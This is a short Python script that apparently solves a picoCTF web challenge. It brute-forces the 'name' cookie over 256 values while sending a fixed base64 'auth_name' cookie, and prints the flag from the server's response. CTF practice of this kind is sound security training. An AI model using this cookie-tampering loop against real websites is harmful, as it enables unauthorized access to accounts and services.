import requests

url = 'http://mercury.picoctf.net:27177/check'

for i in range(256):
	print(f'[+] Index = {i}')
	headers = {
		'Cookie': f'auth_name=TE1YOFZTSU0zYWh1VkpjYUVNQTdXVG01clZRbVplb0NWQWdSZ1hPNCsxRUhMQ3FQUEdWdEttaWhXbm1qbW1Ja3JDWVpLWW8vYVlMTVZsazVCZXlkWkpIZHhyMzRpMmFMTUQ2b1Q1dGtuQmQyeGZNQUlaNFpGaGwzdzc5MkM3TXQ=; name={i}'
	}
	res = requests.get(url, headers=headers)
	content = res.content.decode()
	if "picoCTF" in content:
		print(content)

